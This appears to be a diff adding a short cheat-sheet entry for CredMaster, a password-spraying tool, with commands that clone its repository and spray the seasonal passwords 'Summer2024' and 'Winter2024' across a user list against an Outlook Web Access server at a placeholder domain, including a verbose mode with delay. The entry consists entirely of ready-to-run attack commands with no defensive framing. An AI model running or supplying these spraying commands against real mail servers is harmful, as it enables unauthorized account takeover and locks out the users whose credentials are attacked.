@@ -1,0 +1,10 @@
+# ================= CredMaster =================
+# Clone the repo
+git clone https://github.com/lightos/credMaster.git
+cd credMaster
+
+# Perform password spraying against OWA
+python credMaster.py -u users.txt -p Summer2024 -d domain.com -t owa.domain.com
+
+# Run in verbose mode with delay
+python credMaster.py -u users.txt -p Winter2024 -d domain.com -t owa.domain.com -v -D 2
